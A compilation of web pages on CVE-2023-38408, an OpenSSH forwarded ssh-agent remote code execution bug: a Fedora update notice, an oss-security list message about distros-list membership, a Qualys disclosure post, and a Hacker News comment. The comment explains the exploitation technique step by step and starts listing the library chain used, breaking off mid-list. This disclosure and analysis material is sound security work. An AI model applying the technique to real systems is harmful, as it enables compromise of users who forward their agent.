* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ.mbox.gz?message=CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ/#CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ)

# [SECURITY] Fedora 37 Update: openssh-8.8p1-11.fc37

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

28 Jul
2023

28 Jul
'23

4:40 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2023-79a18e1725
2023-07-28 01:39:45.299954
--------------------------------------------------------------------------------

Name : openssh
Product : Fedora 37
Version : 8.8p1
Release : 11.fc37
URL : <http://www.openssh.com/portable.html>
Summary : An open source implementation of SSH protocol version 2
Description :
SSH (Secure SHell) is a program for logging into and executing
commands on a remote machine. SSH is intended to replace rlogin and
rsh, and to provide secure encrypted communications between two
untrusted hosts over an insecure network. X11 connections and
arbitrary TCP/IP ports can also be forwarded over the secure channel.

OpenSSH is OpenBSD's version of the last free version of SSH, bringing
it up to date in terms of security and features.

This package includes the core files necessary for both the OpenSSH
client and server. To make this package useful, you should also
install openssh-clients, openssh-server, or both.

--------------------------------------------------------------------------------
Update Information:

Security fix for [PUT CVEs HERE]
--------------------------------------------------------------------------------
ChangeLog:

\* Fri Jul 21 2023 Dmitry Belyavskiy dbelyavs@redhat.com - 8.8p1-11
- Fix remote code execution in ssh-agent PKCS#11 support
Resolves: CVE-2023-38408
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2224173 - CVE-2023-38408 openssh: Remote code execution in ssh-agent PKCS#11 support
<https://bugzilla.redhat.com/show_bug.cgi?id=2224173>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2023-79a18e1725' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ/#CEBTJJINE2I3FHAUKKNQWMFGYMLSMWKQ)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from www.openwall.com_8ea67831_20250110_133622.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](10) [[next>]](../../../2023/09/25/1) [[<thread-prev]](9) [[thread-next>]](../../../2023/09/25/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20230922214006.GA20989@openwall.com>
Date: Fri, 22 Sep 2023 23:40:06 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: illumos (or at least danmcd) membership in the distros list

On Fri, Sep 22, 2023 at 07:27:55PM +0200, Solar Designer wrote:
> On Mon, Sep 18, 2023 at 05:36:13PM +0000, Dan McDonald wrote:
> > On Sep 15, 2023, at 5:09 PM, Solar Designer <solar@...nwall.com> wrote:
> > > Can you show illumos fixing non-illumos-only security issues within days
> > > after public disclosure, so that a few days of advance notice would have
> > > made those fixes even quicker?
> >
> > It's a per-illumos-distro property.  OmniOS has Stable & LTS releases.   Here's the current-stable
> > release notes, dynamically updated every time they update:
> >
> > 	<https://github.com/omniosorg/omnios-build/blob/r151046/doc/ReleaseNotes.md>
> >
> > So I'm not sure if a few days of advance notice would make those quicker,
> > but I do know that other distros have biweekly scheduled releases, and advance
> > notice there would keep those wheels spinning faster.  Esp. since "patch tuesday"
> > is a mere one-day before the release branch is forked off on release weeks.
>
> This looks pretty good for OmniOS, e.g. for OpenSSL CVE-2023-3817 it
> appears to be 4 days from OpenSSL advisory on "31st July 2023" to OmniOS
> "r151046n (2023-08-03)", and even something like 1 day for OpenSSH
> update to "9.3p2, fixing CVE-2023-38408" and for "AMD CPU microcode
> updated to 20230719, mitigating CVE-2023-20593 on some Zen2 processors"
> in "r151046m (2023-07-25)" (it was brought to oss-security on July 24).
>
> That page above goes back to May 2023.  Were there separate ones for
> older releases?  For "a publicly verifiable track record, dating back at
> least 1 year and continuing to present day".

I see this one goes from December 2022 to present:

<https://github.com/omniosorg/omnios-build/blob/r151044/doc/ReleaseNotes.md>

and this one from May 2022 to April 2023:

<https://github.com/omniosorg/omnios-build/blob/r151042/doc/ReleaseNotes.md>

So that's already more than a year, and I don't need to look further.

Also, I note this reply by Bob Friesenhahn:

<https://www.openwall.com/lists/oss-security/2023/09/14/1>

On Thu, Sep 14, 2023 at 08:36:17AM -0500, Bob Friesenhahn wrote:
> I am not a member of the 'distros' list, but can vouch for Dan
> McDonald's dedication and capabilities, as observed over several
> years.  Dan did not mention it, but he previously became the primary
> maintainer of an Illumos distribution known as "OmniOS", which I use.
> As a maintainer, Dan did pay close attention to security issues.

So I think we can accept OmniOS as new distros list member, if that's
desired and Dan would represent OmniOS on the list.  This subscription
on its own would not allow sharing of info with other illumos distros.

In special cases, Dan would be able to ask the issue reporters their
explicit permission to share with other illumos distros.

If those distros do typically need the info, they may request direct
list membership.

How does this sound to you, Dan?

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from blog.qualys.com_7ec9d43b_20250110_133623.html ===


* [Discussions](https://success.qualys.com/discussions/s/)
  + [Back to main menu](#back)
  + [BROWSE BY TOPIC](https://qualys-secure.force.com/discussions/s/)BROWSE BY TOPIC
  + [Global IT Asset Management](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIRIWA4/asset-management)
  + [IT Security](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIRwWAO/it-security)
  + [Compliance](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIS1WAO/compliance)
  + [Cloud & Container Security](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIRnWAO/cloud-container)
  + [Web App Security](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HISCWA4/web-app-security)
  + [Certificate Security & SSL Labs](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIRfWAO/certificate-security)
  + [Developer API](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIR8WAO/developer)
  + [Cloud Platform](https://qualys-secure.force.com/discussions/s/topic/0TO2L000000HIRAWA4/qualys-cloud-platform)
  + [Start a discussion](https://qualys-secure.force.com/discussions/s/#start-a-discussion)
* [Blog](https://blog.qualys.com/)
* [Training](https://www.qualys.com/training/)
* [Docs](https://www.qualys.com/documentation/)
* [Support](https://success.qualys.com/customersupport/)
* [Trust](https://success.qualys.com/support/s/standards)

[Community](https://community.qualys.com/ "Qualys Community")

[![](https://d1uyme8f6ss6qi.cloudfront.net/image/icon/link-arrow-left.svg)
Blog Home](/)

# CVE-2023-38408: Remote Code Execution in OpenSSH’s forwarded ssh-agent

![Saeed Abbasi](https://secure.gravatar.com/avatar/cf1c318454e3694de9a913fb0313e42c?s=110&d=mm&r=g)
 [Saeed Abbasi](https://blog.qualys.com/author/sabbasi), Product Manager - Threat Research Unit, Qualys
[July 19, 2023July 24, 2023](https://blog.qualys.com/vulnerabilities-threat-research/2023/07/19/cve-2023-38408-remote-code-execution-in-opensshs-forwarded-ssh-agent) - 3 min read

**Last updated on:** *July 24, 2023*

#### Table of Contents

* [About OpenSSHs Agent Forwarding](#about-opensshs-agent-forwarding)
* [Potential Impact of OpenSSHs Agent Forwarding](#potential-impact-of-opensshs-agent-forwarding)
* [Disclosure Timeline](#disclosure-timeline)
* [Technical Details](#technical-details)
* [Qualys QID Coverage](#qualys-qid-coverage)
* [Conclusion](#conclusion)

The Qualys Threat Research Unit (TRU) has discovered a remote code execution vulnerability in OpenSSH’s forwarded ssh-agent. This vulnerability allows a remote attacker to potentially execute arbitrary commands on vulnerable OpenSSH’s forwarded ssh-agent. Given the widespread use of OpenSSH’s forwarded ssh-agent Qualys Research Unit recommends that security teams apply patches for this vulnerability on priority.

## **About OpenSSH’s Agent Forwarding**

The ssh-agent is a background program that caches private keys for SSH public key authentication, reducing the need for regular passphrase input. Initiated at the start of an X or login session, it operates by storing keys in memory and unloading only when the process ends.

It’s instrumental in automation scripts or tasks requiring frequent server connections, as it prevents the need for insecure password storage or constant passphrase input. The connections to ssh-agent may be forwarded from further remote to avoid the need for authentication data to be stored on other machines. Nonetheless, it’s still crucial to secure the keys with robust passphrases.

## **Potential Impact of OpenSSH’s Agent Forwarding**

Successful exploitation of this vulnerability allows a remote attacker to execute arbitrary commands on vulnerable OpenSSH forwarded ssh-agent.  Qualys security researchers have been able to independently verify the vulnerability, develop a PoC exploit on installations of Ubuntu Desktop 22.04 and 21.10. Other Linux distributions are likely vulnerable and probably exploitable.

As soon as the Qualys research team confirmed the vulnerability, Qualys engaged in responsible vulnerability disclosure and coordinated with the vendor, OpenSSH, on this occasion to announce the vulnerability.

## Disclosure Timeline

2023-07-06: Draft advisory and initial patch sent to OpenSSH.

2023-07-07: OpenSSH sent refined patches.

2023-07-09: Feedback on patches sent to OpenSSH.

2023-07-11: Received final patches from OpenSSH; feedback sent.

2023-07-14: OpenSSH plans for security-only release on July 19th.

2023-07-19: Coordinated release.

## **Technical Details**

You can find the technical details of these vulnerabilities at:

<https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.txt>

<https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.tar.gz>

## **Qualys QID Coverage**

Qualys has recently released a single QID 38904, which is available starting from the vulnsigs version VULNSIGS-2.5.820-3.

| QID | Title | Qualys Release Versions |
| --- | --- | --- |
| 38904 | OpenSSH Remote Code Execution (RCE) Vulnerability in its forwarded ssh-agent | VULNSIGS-2.5.820-3 |

## **Conclusion**

This newly uncovered ssh-agent vulnerability underlines the continuous need for rigorous security measures and immediate response. Even robust systems can harbor hidden vulnerabilities, as demonstrated by the shortcomings of the ssh-agent. Proactively rectifying such vulnerabilities through actions such as implementing patches is critical to maintaining the integrity of digital assets.

### *Related*

![Saeed Abbasi](https://secure.gravatar.com/avatar/cf1c318454e3694de9a913fb0313e42c?s=180&d=mm&r=g)

Written by
 [Saeed Abbasi](https://blog.qualys.com/author/sabbasi), Product Manager - Threat Research Unit, Qualys
Write to Saeed at sabbasi@qualys.com

Like
Share

##### Related content

[vulnerabilities](https://blog.qualys.com/tag/vulnerabilities)

Share your Comments
### Comments [Cancel reply](/vulnerabilities-threat-research/2023/07/19/cve-2023-38408-remote-code-execution-in-opensshs-forwarded-ssh-agent#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name

Email

 Save my name, email, and website in this browser for the next time I comment.

Δ

## Join the discussion today!

**Learn** more about Qualys and industry best practices.

**Share** what you know and build a reputation.

**Secure** your systems and improve security for everyone.

[Start a discussion](https://discussions.qualys.com/discussion/create%21input.jspa)

* [Twitter](https://twitter.com/qualys)
* [LinkedIn](https://www.linkedin.com/company/qualys)
* [Facebook](https://www.facebook.com/qualys)
* [YouTube](https://www.youtube.com/user/QualysGuard)
* [Vimeo](https://vimeo.com/qualys)

### Qualys

* [Qualys.com](https://www.qualys.com/ "Information Security and Compliance | Qualys, Inc.")
* [Qualys Community Edition](https://www.qualys.com/community-edition/ "Free Trial | Qualys, Inc.")
* [Qualys Merchandise Store](https://store.qualys.com/)
### Qualys Communities

* [Vulnerability Management](https://community.qualys.com/vulnerability-management/)
* [Policy Compliance](https://community.qualys.com/policy-compliance/)
* [PCI Compliance](https://community.qualys.com/pci-compliance/)
* [Web App Scanning](https://community.qualys.com/web-app-scanning/)
* [Web App Firewall](https://community.qualys.com/web-app-firewall/)
* [Continuous Monitoring](https://community.qualys.com/continuous-monitoring/)
* [Security Assessment Questionnaire](https://community.qualys.com/security-assessment-questionnaire/)
* [Threat Protection](https://community.qualys.com/threat-protection/)
* [Asset Inventory](https://community.qualys.com/asset-inventory/)
* [AssetView](https://community.qualys.com/asset-view/)
* [CMDB Sync](https://community.qualys.com/cmdb-sync/)
* [Endpoint Detection & Response](https://community.qualys.com/endpoint-detection-response/)
* [Security Configuration Assessment](https://community.qualys.com/security-configuration-assessment/)
* [File Integrity Monitoring](https://community.qualys.com/file-integrity-monitoring/)
* [Cloud Inventory](https://community.qualys.com/cloud-inventory/)
* [Certificate Inventory](https://community.qualys.com/certificate-inventory/)
* [Container Security](https://community.qualys.com/container-security/)
* [Cloud Security Assessment](https://community.qualys.com/cloud-security-assessment/)
* [Certificate Assessment](https://community.qualys.com/certificate-assessment/)
* [Out-of-band Configuration Assessment](https://community.qualys.com/out-of-band-configuration-assessment/)
* [Patch Management](https://community.qualys.com/patch-management/)
* [Developer API](https://community.qualys.com/api/)
* [Cloud Agent](https://community.qualys.com/cloud-agent/)
* [Dashboards & Reporting](https://community.qualys.com/reporting/)
### Discussions

* [All discussions](https://discussions.qualys.com/)
* [Global IT Asset Management](https://discussions.qualys.com/community/asset-inventory)
* [IT Security](https://discussions.qualys.com/community/vulnerability-management)
* [Compliance](https://discussions.qualys.com/community/policy-compliance)
* [Cloud & Container Security](https://discussions.qualys.com/community/cloud-security)
* [Web App Security](https://discussions.qualys.com/community/web-application-scanning)
* [Certificate Security & SSL Labs](https://discussions.qualys.com/community/ssllabs)
* [Developer API](https://discussions.qualys.com/community/developer)
### Blog

* [All posts](https://blog.qualys.com/)
* [Qualys Insights](https://blog.qualys.com/qualys-insights)
* [Product and Tech](https://blog.qualys.com/product-tech)
* [Vulnerabilities and Threat Research](https://blog.qualys.com/vulnerabilities-threat-research)
* [Release Notifications](https://notifications.qualys.com/)
### Training

* [Overview](https://www.qualys.com/training/)
* [Certified Courses](https://www.qualys.com/training/#self-paced)
* [Video Library](https://www.qualys.com/training/#video-library)
* [Instructor-led Training](https://www.qualys.com/training/#instructor-led)
### Docs

* [Overview](https://www.qualys.com/documentation/)
* [Release Notes](https://www.qualys.com/documentation/release-notes/)
### Support

* [Support Portal](https://qualys-secure.force.com/customer/s/)

© 2025 Qualys, Inc. All rights reserved. [Privacy Policy](https://www.qualys.com/company/privacy/) . [Accessibility](https://www.qualys.com/company/accessibility/)

![Cleantalk Pixel](https://moderate6-v4.cleantalk.org/pixel/c2fb893108a2a6f9f0405f44b2224aff.gif "Cleantalk Pixel")



=== Content from news.ycombinator.com_b698cc04_20250110_133629.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D36790196) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Remote code execution in OpenSSH’s forwarded SSH-agent](https://blog.qualys.com/vulnerabilities-threat-research/2023/07/19/cve-2023-38408-remote-code-execution-in-opensshs-forwarded-ssh-agent) ([qualys.com](from?site=qualys.com)) | | --- | --- | --- | |  | | 271 points by [vitplister](user?id=vitplister) [on July 19, 2023](item?id=36790196)  | [hide](hide?id=36790196&goto=item%3Fid%3D36790196) | [past](https://hn.algolia.com/?query=Remote%20code%20execution%20in%20OpenSSH%E2%80%99s%20forwarded%20SSH-agent&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=36790196&auth=b6f7c1fba9dc7c44a527bf3e32d4f788b927e77c) | [173 comments](item?id=36790196) |  | |  |  | [tptacek](user?id=tptacek) [on July 19, 2023](item?id=36792299)   | [next](#36791441) [–]  This is the bug of the year. It's well established that if Alice forwards an SSH agent to Bob, Bob can use the SSH agent protocol to make Alice open DLLs, because there's an agent protocol command (SSH\_AGENTC\_ADD\_SMARTCARD\_KEY) that OpenSSH implements with dlopen: when you ask the agent to access a smart card, OpenSSH dlopen()'s the library corresponding to the `id` of the device. This is a Jann Horn bug from 2016, and OpenSSH fixed it by whitelisting DLLs to /usr/lib and directories like it. The Qualys bug builds on Horn's bug. When OpenSSH dlopen()'s the library, it then tries to look up a PKCS#11 entry point function, and, when it doesn't find it, it dlclose()'s the library and returns an error. The issue is that most of the libraries in system library paths were never intended to be opened maliciously, and so they do all sorts of stuff in their constructors and destructors (any function marked `\_\_attribute\_\_((constructor))` or `destructor` is called by dlopen and dlclose respectively). In particular, they register callbacks and signal handlers. Most of these libraries are never expected to dlclose at all, so they tend not to be great about cleaning up. Better still, if you randomly load oddball libraries into random programs, some of them crash, generating SIGBUS and SIGSEGV. So you've got a classic UAF situation here: (1) force Alice to load a library that registers a SIGBUS handler; it won't be a PKCS#11 handler so it'll get immediately dlclose()'d, but won't clean up the handler. (2) Load another library, which will take over the program text address the signal handler points to. (3) Finally, load a library that SIGBUS's. If you manage to get a controlled jump swapped into place in step (2), you win. If you're thinking "it's pretty unlikely you're going to be able to line up a controlled jump at exactly the address previously registered as a signal handler", you're right, but there's another quirk of dlclose() they take advantage of: there's an ELF flag, NODELETE, that instructs the linker not to unmap a library when it's unloaded, and a bunch of standard libraries set it, so you can use those libraries to groom the address space. Finally, because some runtimes require executable stacks, there are standard libraries with an ELF flag that instructs the process to make the stack executable. If you load one of these libraries, and you have a controlled jump, you can write shellcode into the stack like it's 1998. To figure out the right sequence of steps, they basically recapitulated the original ROP gadget research idea: they swept all the standard Ubuntu libraries with a fuzzer to find combinations of loads that produced controlled jumps (ie, that died trying to execute stack addresses). A working exploit loads a pattern of "smartcards" that looks like this (all in /usr/lib): ```     syslinux/modules/efi64/gfxboot.c32 (execstack)     pulse-15.0+dfsg1/modules/module-remap-sink.so (groom)     x86_64-linux-gnu/libgnatcoll_postgres.so.1 (SIGBUS handler)     pulse-15.0+dfsg1/modules/module-http-protocol-unix.so (groom)     x86_64-linux-gnu/sane/libsane-hp.so.1.0.32 (groom)     libreoffice/program/libindex_data.so (groom)     x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so (groom)     